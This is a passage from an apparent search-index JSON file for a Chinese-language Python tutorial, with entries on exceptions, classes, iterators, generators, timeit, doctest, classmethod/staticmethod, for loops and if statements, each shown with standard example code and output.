\u8f6c\u6362\u5f02\u5e38\u65f6\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5f88\u6709\u7528\u3002\u4f8b\u5982\uff1a >>> >>> def func(): ... raise ConnectionError ... >>> try: ... func() ... except ConnectionError as exc: ... raise RuntimeError('Failed to open database') from exc ... Traceback (most recent call last): File \"<stdin>\", line 2, in <module> File \"<stdin>\", line 2, in func ConnectionError The above exception was the direct cause of the following exception: Traceback (most recent call last): File \"<stdin>\", line 4, in <module> RuntimeError: Failed to open database \u5f02\u5e38\u94fe\u4f1a\u5728 [ except ]\u6216 [ finally ] \u5b50\u53e5\u5185\u90e8\u5f15\u53d1\u5f02\u5e38\u65f6\u81ea\u52a8\u751f\u6210\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 from None \u8fd9\u6837\u7684\u5199\u6cd5\u6765\u7981\u7528: >>> >>> try: ... open('database.sqlite') ... except OSError: ... raise RuntimeError from None ... Traceback (most recent call last): File \"<stdin>\", line 4, in <module> RuntimeError \u5f02\u5e38\u94fe\u673a\u5236\u8be6\u89c1 \u5185\u7f6e\u5f02\u5e38 \u3002","title":"\u5f02\u5e38\u94fe"},{"location":"programming_language/python/basics/basic/#_5","text":"\u5f53\u7136\uff0c __init__() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u6709\u989d\u5916\u53c2\u6570\u4ee5\u5b9e\u73b0\u66f4\u9ad8\u7075\u6d3b\u6027\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u63d0\u4f9b\u7ed9\u7c7b\u5b9e\u4f8b\u5316\u8fd0\u7b97\u7b26\u7684\u53c2\u6570\u5c06\u88ab\u4f20\u9012\u7ed9 __init__() \u3002 \u4f8b\u5982\uff0c: >>> >>> class Complex: ... def __init__(self, realpart, imagpart): ... self.r = realpart ... self.i = imagpart ... >>> x = Complex(3.0, -4.5) >>> x.r, x.i (3.0, -4.5)","title":"\u7c7b\u7684\u6784\u9020\u51fd\u6570"},{"location":"programming_language/python/basics/basic/#_6","text":"class A(object): def __init__(self): self.__data = [] # \u7ffb\u8bd1\u6210 self._A__data=[] def add(self, item): self.__data.append(item) # \u7ffb\u8bd1\u6210 self._A__data.append(item) def printData(self): print(self.__data) # \u7ffb\u8bd1\u6210 self._A__data a = A() a.add('hello') a.add('python') a.printData() # print a.__data #\u5916\u754c\u4e0d\u80fd\u8bbf\u95ee\u79c1\u6709\u53d8\u91cf AttributeError: 'A' object has no attribute '__data' print(a._A__data) # \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u5916\u9762\u4e5f\u80fd\u591f\u8bbf\u95ee\u201c\u79c1\u6709\u201d\u53d8\u91cf\uff1b\u8fd9\u4e00\u70b9\u5728\u8c03\u8bd5\u4e2d\u662f\u6bd4\u8f83\u6709\u7528\u7684\uff01 \u7ed3\u679c\uff1a ['hello', 'python'] ['hello', 'python']","title":"\u7c7b\u4e2d\u79c1\u6709\u53d8\u91cf"},{"location":"programming_language/python/basics/basic/#_7","text":"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u60a8\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u5927\u591a\u6570\u5bb9\u5668\u5bf9\u8c61\u90fd\u53ef\u4ee5\u4f7f\u7528 [ for ] \u8bed\u53e5: for element in [1, 2, 3]: print(element) for element in (1, 2, 3): print(element) for key in {'one':1, 'two':2}: print(key) for char in \"123\": print(char) for line in open(\"myfile.txt\"): print(line, end='') \u8fd9\u79cd\u8bbf\u95ee\u98ce\u683c\u6e05\u6670\u3001\u7b80\u6d01\u53c8\u65b9\u4fbf\u3002 \u8fed\u4ee3\u5668\u7684\u4f7f\u7528\u975e\u5e38\u666e\u904d\u5e76\u4f7f\u5f97 Python \u6210\u4e3a\u4e00\u4e2a\u7edf\u4e00\u7684\u6574\u4f53\u3002 \u5728\u5e55\u540e\uff0c[ for ]\u8bed\u53e5\u4f1a\u5728\u5bb9\u5668\u5bf9\u8c61\u4e0a\u8c03\u7528 [ iter() ]\u3002 \u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5b9a\u4e49\u4e86 [ __next__() ] \u65b9\u6cd5\u7684\u8fed\u4ee3\u5668\u5bf9\u8c61\uff0c\u6b64\u65b9\u6cd5\u5c06\u9010\u4e00\u8bbf\u95ee\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u3002 \u5f53\u5143\u7d20\u7528\u5c3d\u65f6\uff0c[ __next__() ] \u5c06\u5f15\u53d1 [ StopIteration ] \u5f02\u5e38\u6765\u901a\u77e5\u7ec8\u6b62 for \u5faa\u73af\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 [ next() ] \u5185\u7f6e\u51fd\u6570\u6765\u8c03\u7528 [ __next__() ]\u65b9\u6cd5\uff1b\u8fd9\u4e2a\u4f8b\u5b50\u663e\u793a\u4e86\u5b83\u7684\u8fd0\u4f5c\u65b9\u5f0f: >>> >>> s = 'abc' >>> it = iter(s) >>> it <iterator object at 0x00A1DB50> >>> next(it) 'a' >>> next(it) 'b' >>> next(it) 'c' >>> next(it) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> next(it) StopIteration \u770b\u8fc7\u8fed\u4ee3\u5668\u534f\u8bae\u7684\u5e55\u540e\u673a\u5236\uff0c\u7ed9\u4f60\u7684\u7c7b\u6dfb\u52a0\u8fed\u4ee3\u5668\u884c\u4e3a\u5c31\u5f88\u5bb9\u6613\u4e86\u3002 \u5b9a\u4e49\u4e00\u4e2a __iter__() \u65b9\u6cd5\u6765\u8fd4\u56de\u4e00\u4e2a\u5e26\u6709 [ __next__() ] \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5982\u679c\u7c7b\u5df2\u5b9a\u4e49\u4e86 __next__() \uff0c\u5219 __iter__() \u53ef\u4ee5\u7b80\u5355\u5730\u8fd4\u56de self : class Reverse: \"\"\"Iterator for looping over a sequence backwards.\"\"\" def __init__(self, data): self.data = data self.index = len(data) def __iter__(self): return self def __next__(self): if self.index == 0: raise StopIteration self.index = self.index - 1 return self.data[self.index] >>> >>> rev = Reverse('spam') >>> iter(rev) <__main__.Reverse object at 0x00A1DB50> >>> for char in rev: ... print(char) ... m a p s","title":"\u8fed\u4ee3\u5668"},{"location":"programming_language/python/basics/basic/#_8","text":"\u751f\u6210\u5668 \u662f\u4e00\u4e2a\u7528\u4e8e\u521b\u5efa\u8fed\u4ee3\u5668\u7684\u7b80\u5355\u800c\u5f3a\u5927\u7684\u5de5\u5177\u3002 \u5b83\u4eec\u7684\u5199\u6cd5\u7c7b\u4f3c\u4e8e\u6807\u51c6\u7684\u51fd\u6570\uff0c\u4f46\u5f53\u5b83\u4eec\u8981\u8fd4\u56de\u6570\u636e\u65f6\u4f1a\u4f7f\u7528 [ yield ]\u8bed\u53e5\u3002 \u6bcf\u6b21\u5728\u751f\u6210\u5668\u4e0a\u8c03\u7528 [ next() ] \u65f6\uff0c\u5b83\u4f1a\u4ece\u4e0a\u6b21\u79bb\u5f00\u7684\u4f4d\u7f6e\u6062\u590d\u6267\u884c\uff08\u5b83\u4f1a\u8bb0\u4f4f\u4e0a\u6b21\u6267\u884c\u8bed\u53e5\u65f6\u7684\u6240\u6709\u6570\u636e\u503c\uff09\u3002 \u4e00\u4e2a\u663e\u793a\u5982\u4f55\u975e\u5e38\u5bb9\u6613\u5730\u521b\u5efa\u751f\u6210\u5668\u7684\u793a\u4f8b\u5982\u4e0b: range\u529f\u80fd\uff1a range(start, stop[, step]) \u53c2\u6570\u8bf4\u660e\uff1a start: \u8ba1\u6570\u4ece start \u5f00\u59cb\u3002\u9ed8\u8ba4\u662f\u4ece 0 \u5f00\u59cb\u3002\u4f8b\u5982range\uff085\uff09\u7b49\u4ef7\u4e8erange\uff080\uff0c 5\uff09; stop: \u8ba1\u6570\u5230 stop \u7ed3\u675f\uff0c\u4f46\u4e0d\u5305\u62ec stop\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u662f[0, 1, 2, 3, 4]\u6ca1\u67095 step\uff1a\u6b65\u957f\uff0c\u9ed8\u8ba4\u4e3a1\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u7b49\u4ef7\u4e8e range(0, 5, 1) \u4f8b\u5982\uff1a for i in range(3,-1,-1): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 3 2 1 0 \u751f\u6210\u5668 def reverse(data): for index in range(len(data)-1, -1, -1): yield data[index] >>> >>> for char in reverse('golf'): ... print(char) ... f l o g \u53ef\u4ee5\u7528\u751f\u6210\u5668\u6765\u5b8c\u6210\u7684\u64cd\u4f5c\u540c\u6837\u53ef\u4ee5\u7528\u524d\u4e00\u8282\u6240\u63cf\u8ff0\u7684\u57fa\u4e8e\u7c7b\u7684\u8fed\u4ee3\u5668\u6765\u5b8c\u6210\u3002 \u4f46\u751f\u6210\u5668\u7684\u5199\u6cd5\u66f4\u4e3a\u7d27\u51d1\uff0c\u56e0\u4e3a\u5b83\u4f1a\u81ea\u52a8\u521b\u5efa __iter__() \u548c [ __next__() ] \u65b9\u6cd5\u3002 \u53e6\u4e00\u4e2a\u5173\u952e\u7279\u6027\u5728\u4e8e\u5c40\u90e8\u53d8\u91cf\u548c\u6267\u884c\u72b6\u6001\u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u4e4b\u95f4\u81ea\u52a8\u4fdd\u5b58\u3002 \u8fd9\u4f7f\u5f97\u8be5\u51fd\u6570\u76f8\u6bd4\u4f7f\u7528 self.index \u548c self.data \u8fd9\u79cd\u5b9e\u4f8b\u53d8\u91cf\u7684\u65b9\u5f0f\u66f4\u6613\u7f16\u5199\u4e14\u66f4\u4e3a\u6e05\u6670\u3002 \u9664\u4e86\u4f1a\u81ea\u52a8\u521b\u5efa\u65b9\u6cd5\u548c\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001\uff0c\u5f53\u751f\u6210\u5668\u7ec8\u7ed3\u65f6\uff0c\u5b83\u4eec\u8fd8\u4f1a\u81ea\u52a8\u5f15\u53d1 [ StopIteration ]\u3002 \u8fd9\u4e9b\u7279\u6027\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u4f7f\u5f97\u521b\u5efa\u8fed\u4ee3\u5668\u80fd\u4e0e\u7f16\u5199\u5e38\u89c4\u51fd\u6570\u4e00\u6837\u5bb9\u6613\u3002","title":"\u751f\u6210\u5668"},{"location":"programming_language/python/basics/basic/#_9","text":"\u4e00\u4e9bPython\u7528\u6237\u5bf9\u4e86\u89e3\u540c\u4e00\u95ee\u9898\u7684\u4e0d\u540c\u65b9\u6cd5\u7684\u76f8\u5bf9\u6027\u80fd\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3\u3002 Python\u63d0\u4f9b\u4e86\u4e00\u79cd\u53ef\u4ee5\u7acb\u5373\u56de\u7b54\u8fd9\u4e9b\u95ee\u9898\u7684\u6d4b\u91cf\u5de5\u5177\u3002 \u4f8b\u5982\uff0c\u5143\u7ec4\u5c01\u5305\u548c\u62c6\u5305\u529f\u80fd\u76f8\u6bd4\u4f20\u7edf\u7684\u4ea4\u6362\u53c2\u6570\u53ef\u80fd\u66f4\u5177\u5438\u5f15\u529b\u3002[ timeit ]\u6a21\u5757\u53ef\u4ee5\u5feb\u901f\u6f14\u793a\u5728\u8fd0\u884c\u6548\u7387\u65b9\u9762\u4e00\u5b9a\u7684\u4f18\u52bf: >>> >>> from timeit import Timer >>> Timer('t=a; a=b; b=t', 'a=1; b=2').timeit() 0.57535828626024577 >>> Timer('a,b = b,a', 'a=1; b=2').timeit() 0.54962537085770791 \u4e0e [ timeit ]\u7684\u7cbe\u7ec6\u7c92\u5ea6\u7ea7\u522b\u76f8\u53cd\uff0c [ profile ] \u6a21\u5757\u63d0\u4f9b\u4e86\u7528\u4e8e\u5728\u8f83\u5927\u7684\u4ee3\u7801\u5757\u4e2d\u8bc6\u522b\u65f6\u95f4\u5173\u952e\u90e8\u5206\u7684\u5de5\u5177\u3002","title":"\u6027\u80fd\u6d4b\u91cf"},{"location":"programming_language/python/basics/basic/#_10","text":"import flask print(dir(flask))","title":"\u67e5\u770b\u5305\u5185\u5bf9\u8c61"},{"location":"programming_language/python/basics/basic/#_11","text":"def average(values): \"\"\"Computes the arithmetic mean of a list of numbers. >>> print(average([20, 30, 70])) 45.0 \"\"\" return sum(values) / len(values) result = average([20, 30, 70]) print(result) import doctest doctest.testmod() \u5728\u5f15\u53f7\u4e2d\uff0c\u5355\u5143\u6d4b\u8bd5\u60f3\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u7ed3\u679c\u7b49\u4e8e45 \u8fd0\u884c\u7ed3\u679c\uff1a 40.0 ********************************************************************** File \"D:\\idea\\infra-web\\tar\\test\\flask_learn\\unit_test.py\", line 4, in __main__.average Failed example: print(average([20, 30, 70])) Expected: 45.0 Got: 40.0 ********************************************************************** 1 items had failures: 1 of 1 in __main__.average ***Test Failed*** 1 failures. \u7531\u4e8e\u8fd0\u884c\u7ed3\u679c\u4e3a40\uff0c\u4e0d\u7b26\u5408\u9884\u671f\uff0c\u6240\u4ee5\u62a5\u9519","title":"\u5355\u5143\u6d4b\u8bd5"},{"location":"programming_language/python/basics/basic/#_12","text":">>> x = 42 >>> def spam(a, b=x): ... print(a, b) ... >>> spam(1) 1 42 >>> x = 23 # Has no effect >>> spam(1) 1 42 >>>","title":"\u65b9\u6cd5\u8bbe\u7f6e\u9ed8\u8ba4\u53c2\u6570"},{"location":"programming_language/python/basics/basic/#classmethod","text":"#!/usr/bin/python # -*- coding: UTF-8 -*- class A(object): bar = 1 def func1(self): print ('foo') @classmethod def func2(cls): print ('func2') print (cls.bar) cls().func1() # \u8c03\u7528 foo \u65b9\u6cd5 A.func2() # \u4e0d\u9700\u8981\u5b9e\u4f8b\u5316 \u7ed3\u679c\uff1a func2 1 foo Python\u67093\u79cd\u65b9\u6cd5\uff0c\u9759\u6001\u65b9\u6cd5\uff08staticmethod\uff09\uff0c\u7c7b\u65b9\u6cd5\uff08classmethod\uff09\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002\u4e0b\u9762\u7528\u4ee3\u7801\u4e3e\u4f8b\u3002 \u5bf9\u4e8e\u4e00\u822c\u7684\u51fd\u6570foo(x)\uff0c\u5b83\u8ddf\u7c7b\u548c\u7c7b\u7684\u5b9e\u4f8b\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\uff0c\u76f4\u63a5\u8c03\u7528foo(x)\u5373\u53ef\u3002 # -*- coding:utf-8 -*- def foo(x): print(\"running foo(%s)\" % x) foo(\"test\") \u5728\u7c7bA\u91cc\u9762\u7684\u5b9e\u4f8b\u65b9\u6cd5foo(self, x)\uff0c \u7b2c\u4e00\u4e2a\u53c2\u6570\u662fself \uff0c\u6211\u4eec\u9700\u8981\u6709\u4e00\u4e2aA\u7684\u5b9e\u4f8b\uff0c\u624d\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 # -*- coding:utf-8 -*- class A: def foo(self, x): print(\"running foo(%s, %s)\" % (self, x)) # A.foo(x) \u8fd9\u6837\u4f1a\u62a5\u9519 a = A() a.foo(\"test\") \u5f53\u6211\u4eec\u9700\u8981\u548c\u7c7b\u76f4\u63a5\u8fdb\u884c\u4ea4\u4e92\uff0c\u800c\u4e0d\u9700\u8981\u548c\u5b9e\u4f8b\u8fdb\u884c\u4ea4\u4e92\u65f6\uff0c\u7c7b\u65b9\u6cd5\u662f\u6700\u597d\u7684\u9009\u62e9\u3002\u7c7b\u65b9\u6cd5\u4e0e\u5b9e\u4f8b\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4f46\u662f\u4f20\u9012\u7684\u4e0d\u662f\u7c7b\u7684\u5b9e\u4f8b\uff0c\u800c\u662f\u7c7b\u672c\u8eab\uff0c \u7b2c\u4e00\u4e2a\u53c2\u6570\u662fcls \u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u7c7b\u7684\u5b9e\u4f8b\u8c03\u7528\u7c7b\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u7c7b\u540d\u6765\u8c03\u7528\u3002 # -*- coding:utf-8 -*- class A: class_attr = \"attr\" def __init__(self): pass @classmethod def class_foo(cls): print(\"running class_foo(%s)\" % (cls.class_attr)) a = A() a.class_foo() A.class_foo() \u9759\u6001\u65b9\u6cd5\u7c7b\u4f3c\u666e\u901a\u65b9\u6cd5\uff0c\u53c2\u6570\u91cc\u9762\u4e0d\u7528self\u3002\u8fd9\u4e9b\u65b9\u6cd5\u548c\u7c7b\u76f8\u5173\uff0c\u4f46\u662f\u53c8\u4e0d\u9700\u8981\u7c7b\u548c\u5b9e\u4f8b\u4e2d\u7684\u4efb\u4f55\u4fe1\u606f\u3001\u5c5e\u6027\u7b49\u7b49\u3002\u5982\u679c\u628a\u8fd9\u4e9b\u65b9\u6cd5\u5199\u5230\u7c7b\u5916\u9762\uff0c\u8fd9\u6837\u5c31\u628a\u548c\u7c7b\u76f8\u5173\u7684\u4ee3\u7801\u5206\u6563\u5230\u7c7b\u5916\uff0c\u4f7f\u5f97\u4e4b\u540e\u5bf9\u4e8e\u4ee3\u7801\u7684\u7406\u89e3\u548c\u7ef4\u62a4\u90fd\u662f\u5de8\u5927\u7684\u969c\u788d\u3002\u800c\u9759\u6001\u65b9\u6cd5\u5c31\u662f\u7528\u6765\u89e3\u51b3\u8fd9\u4e00\u7c7b\u95ee\u9898\u7684\u3002 \u6bd4\u5982\u6211\u4eec\u68c0\u67e5\u662f\u5426\u5f00\u542f\u4e86\u65e5\u5fd7\u529f\u80fd\uff0c\u8fd9\u4e2a\u548c\u7c7b\u76f8\u5173\uff0c\u4f46\u662f\u8ddf\u7c7b\u7684\u5c5e\u6027\u548c\u5b9e\u4f8b\u90fd\u6ca1\u6709\u5173\u7cfb\u3002 # -*- coding:utf-8 -*- log_enabled = True class A: class_attr = \"attr\" def __init__(self): pass @staticmethod def static_foo(): if log_enabled: print(\"log is enabled\") else: print(\"log is disabled\") A.static_foo() @staticmethod\u4e0d\u9700\u8981\u8868\u793a\u81ea\u8eab\u5bf9\u8c61\u7684self\u548c\u81ea\u8eab\u7c7b\u7684cls\u53c2\u6570\uff0c\u5c31\u8ddf\u4f7f\u7528\u51fd\u6570\u4e00\u6837\u3002 @classmethod\u4e5f\u4e0d\u9700\u8981self\u53c2\u6570\uff0c\u4f46\u7b2c\u4e00\u4e2a\u53c2\u6570\u9700\u8981\u662f\u8868\u793a\u81ea\u8eab\u7c7b\u7684cls\u53c2\u6570\u3002 \u5982\u679c\u5728@staticmethod\u4e2d\u8981\u8c03\u7528\u5230\u8fd9\u4e2a\u7c7b\u7684\u4e00\u4e9b\u5c5e\u6027\u65b9\u6cd5\uff0c\u53ea\u80fd\u76f4\u63a5\u7c7b\u540d.\u5c5e\u6027\u540d\u6216\u7c7b\u540d.\u65b9\u6cd5\u540d\u3002 \u800c@classmethod\u56e0\u4e3a\u6301\u6709cls\u53c2\u6570\uff0c\u53ef\u4ee5\u6765\u8c03\u7528\u7c7b\u7684\u5c5e\u6027\uff0c\u7c7b\u7684\u65b9\u6cd5\uff0c\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7b49\uff0c\u907f\u514d\u786c\u7f16\u7801\u3002","title":"classmethod \u7684\u4f7f\u7528\u65b9\u6cd5"},{"location":"programming_language/python/basics/for%E5%BE%AA%E7%8E%AF/","text":"\u5faa\u73af \u5faa\u73af\u8bed\u53e5\uff0c\u800c[\u5faa\u73af\u8bed\u53e5]\u7531[\u5faa\u73af\u4f53]\u53ca\u5faa\u73af\u7684\u5224\u5b9a[\u6761\u4ef6]\u4e24\u90e8\u5206\u7ec4\u6210 for_stmt ::= \"for\" target_list \"in\" expression_list \":\" suite [\"else\" \":\" suite] for \u8bed\u53e5 Python for \u5faa\u73af\u53ef\u4ee5\u904d\u5386\u4efb\u4f55\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u5982\u4e00\u4e2a\u5217\u8868\u6216\u8005\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 for\u5faa\u73af\u7684\u4e00\u822c\u683c\u5f0f\u5982\u4e0b\uff1a for <variable> in <sequence>: <statements> else: <statements> \u4f8b\uff1a for i in range(5,8): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 5 6 7 break \u3001 continue \u8bed\u53e5\u53ca else \u5b50\u53e5 break \u8bed\u53e5\uff0c\u7528\u4e8e\u8df3\u51fa\u6700\u8fd1\u7684 for \u6216 while \u5faa\u73af\u3002 \u5faa\u73af\u8bed\u53e5\u652f\u6301 else \u5b50\u53e5\uff1b for \u5faa\u73af\u4e2d\uff0c\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u5168\u90e8\u5faa\u73af\u5b8c\u6bd5\uff0c\u6216 while \u5faa\u73af\u7684\u6761\u4ef6\u4e3a\u5047\u65f6\uff0c\u6267\u884c\u8be5\u5b50\u53e5\uff1b break \u8bed\u53e5\u7ec8\u6b62\u5faa\u73af\u65f6\uff0c\u4e0d\u6267\u884c\u8be5\u5b50\u53e5\u3002 \u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u67e5\u627e\u7d20\u6570\u7684\u5faa\u73af\u793a\u4f8b\uff1a for n in range(2, 10): for x in range(2, n): if n % x == 0: print(n, 'equals', x, '*', n // x) break else: print(n, 'is a prime number') \u8fd0\u884c\u7ed3\u679c\uff1a 2 is a prime number 3 is a prime number 4 equals 2 * 2 5 is a prime number 6 equals 2 * 3 7 is a prime number 8 equals 2 * 4 9 equals 3 * 3 continue \u8bed\u53e5\uff0c\u8868\u793a\u7ee7\u7eed\u6267\u884c\u5faa\u73af\u7684\u4e0b\u4e00\u6b21\u8fed\u4ee3 for num in range(2, 10): if num % 2 == 0: print(\"Found an even number\", num) continue print(\"Found an odd number\", num) \u8fd0\u884c\u7ed3\u679c\uff1a Found an even number 2 Found an odd number 3 Found an even number 4 Found an odd number 5 Found an even number 6 Found an odd number 7 Found an even number 8 Found an odd number 9","title":"for\u5faa\u73af"},{"location":"programming_language/python/basics/for%E5%BE%AA%E7%8E%AF/#_1","text":"\u5faa\u73af\u8bed\u53e5\uff0c\u800c[\u5faa\u73af\u8bed\u53e5]\u7531[\u5faa\u73af\u4f53]\u53ca\u5faa\u73af\u7684\u5224\u5b9a[\u6761\u4ef6]\u4e24\u90e8\u5206\u7ec4\u6210 for_stmt ::= \"for\" target_list \"in\" expression_list \":\" suite [\"else\" \":\" suite]","title":"\u5faa\u73af"},{"location":"programming_language/python/basics/for%E5%BE%AA%E7%8E%AF/#for","text":"Python for \u5faa\u73af\u53ef\u4ee5\u904d\u5386\u4efb\u4f55\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u5982\u4e00\u4e2a\u5217\u8868\u6216\u8005\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 for\u5faa\u73af\u7684\u4e00\u822c\u683c\u5f0f\u5982\u4e0b\uff1a for <variable> in <sequence>: <statements> else: <statements> \u4f8b\uff1a for i in range(5,8): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 5 6 7","title":"for \u8bed\u53e5"},{"location":"programming_language/python/basics/for%E5%BE%AA%E7%8E%AF/#breakcontinue-else","text":"break \u8bed\u53e5\uff0c\u7528\u4e8e\u8df3\u51fa\u6700\u8fd1\u7684 for \u6216 while \u5faa\u73af\u3002 \u5faa\u73af\u8bed\u53e5\u652f\u6301 else \u5b50\u53e5\uff1b for \u5faa\u73af\u4e2d\uff0c\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u5168\u90e8\u5faa\u73af\u5b8c\u6bd5\uff0c\u6216 while \u5faa\u73af\u7684\u6761\u4ef6\u4e3a\u5047\u65f6\uff0c\u6267\u884c\u8be5\u5b50\u53e5\uff1b break \u8bed\u53e5\u7ec8\u6b62\u5faa\u73af\u65f6\uff0c\u4e0d\u6267\u884c\u8be5\u5b50\u53e5\u3002 \u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u67e5\u627e\u7d20\u6570\u7684\u5faa\u73af\u793a\u4f8b\uff1a for n in range(2, 10): for x in range(2, n): if n % x == 0: print(n, 'equals', x, '*', n // x) break else: print(n, 'is a prime number') \u8fd0\u884c\u7ed3\u679c\uff1a 2 is a prime number 3 is a prime number 4 equals 2 * 2 5 is a prime number 6 equals 2 * 3 7 is a prime number 8 equals 2 * 4 9 equals 3 * 3 continue \u8bed\u53e5\uff0c\u8868\u793a\u7ee7\u7eed\u6267\u884c\u5faa\u73af\u7684\u4e0b\u4e00\u6b21\u8fed\u4ee3 for num in range(2, 10): if num % 2 == 0: print(\"Found an even number\", num) continue print(\"Found an odd number\", num) \u8fd0\u884c\u7ed3\u679c\uff1a Found an even number 2 Found an odd number 3 Found an even number 4 Found an odd number 5 Found an even number 6 Found an odd number 7 Found an even number 8 Found an odd number 9","title":"break\u3001continue \u8bed\u53e5\u53ca else \u5b50\u53e5"},{"location":"programming_language/python/basics/if%E8%AF%AD%E5%8F%A5/","text":"if\u8bed\u53e5 \u5b9a\u4e49 if\u8bed\u53e5\u662f\u6307\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7528\u6765\u5224\u5b9a\u6240\u7ed9\u5b9a\u7684\u6761\u4ef6\u662f\u5426\u6ee1\u8db3\uff0c\u6839\u636e\u5224\u5b9a\u7684\u7ed3\u679c\uff08\u771f\u6216\u5047\uff09\u51b3\u5b9a\u6267\u884c\u7ed9\u51fa\u7684\u4e24\u79cd\u64cd\u4f5c\u4e4b\u4e00 if \u8bed\u53e5\u5305\u542b\u96f6\u4e2a\u6216\u591a\u4e2a [ elif ] \u5b50\u53e5\u53ca\u53ef\u9009\u7684 [ else ] \u5b50\u53e5\u3002\u5173\u952e\u5b57 ' elif ' \u662f 'else if' \u7684\u7f29\u5199\uff0c\u9002\u7528\u4e8e\u907f\u514d\u8fc7\u591a\u7684\u7f29\u8fdb\u3002 if ... elif ... elif ... \u5e8f\u5217\u53ef\u4ee5\u5f53\u4f5c\u5176\u4ed6\u8bed\u8a00\u4e2d switch \u6216 case \u8bed\u53e5\u7684\u66ff\u4ee3\u54c1\u3002 \u6700\u7b80\u5355\u7684if \u4f8b x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: -9 \u5c0f\u4e8e\u96f6 x\u73b0\u5728\u662f0 \u5305\u542belse \u4f8b x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: -10 \u5c0f\u4e8e\u96f6 x\u73b0\u5728\u662f0 \u5305\u542belif \u4f8b \u5982\u679c\u8981\u628a\u4e00\u4e2a\u503c\u4e0e\u591a\u4e2a\u5e38\u91cf\u8fdb\u884c\u6bd4\u8f83\uff0c\u6216\u8005\u68c0\u67e5\u7279\u5b9a\u7c7b\u578b\u6216\u5c5e\u6027\uff0c match \u8bed\u53e5\u66f4\u5b9e\u7528\u3002 x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') elif x == 0: print('\u662f\u96f6') elif x == 1: print('\u662f\u4e00') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u8fd0\u884c\u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: 1 \u662f\u4e00 x\u73b0\u5728\u662f1 \u6ce8\u610f\u4e8b\u9879 if\u8bed\u53e5\u662f\u4f9d\u6b21\u4ece\u4e0a\u5f80\u4e0b\u6267\u884c\uff0c\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u6761\u4ef6\u6ee1\u8db3\u4e86\uff0c\u90a3\u4e48\u4e0b\u9762\u7684\u8bed\u53e5\u5c31\u90fd\u4e0d\u6267\u884c\u4e86\u3002\u4f8b\u5982\u4e0b\u9762\u7684\u6848\u4f8b\uff1a x = int(input(\"\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \")) if x < 0: x = 0 print('\u5c0f\u4e8e\u96f6') elif x > 0: print('\u5927\u4e8e\u96f6') elif x == 0: print('\u662f\u96f6') elif x == 1: print('\u662f\u4e00') else: print('\u90fd\u4e0d\u662f') print('x\u73b0\u5728\u662f'+str(x)) \u7ed3\u679c\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570: 1 \u5927\u4e8e\u96f6 x\u73b0\u5728\u662f1 \u7531\u4e8e1\u5927\u4e8e0\uff0c\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u5462\uff0c\u5c31\u6267\u884c\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u4e0b\u9762\u7684\u8bed\u53e5\uff0c\u867d\u7136\u4e5f\u6ee1\u8db3\u7b2c\u56db\u4e2a\u6761\u4ef6\uff0c\u4f46\u662f\u6267\u884c\u5b8c\u7b2c\u4e8c\u4e2a\u5c31\u9000\u51fa\u4e86 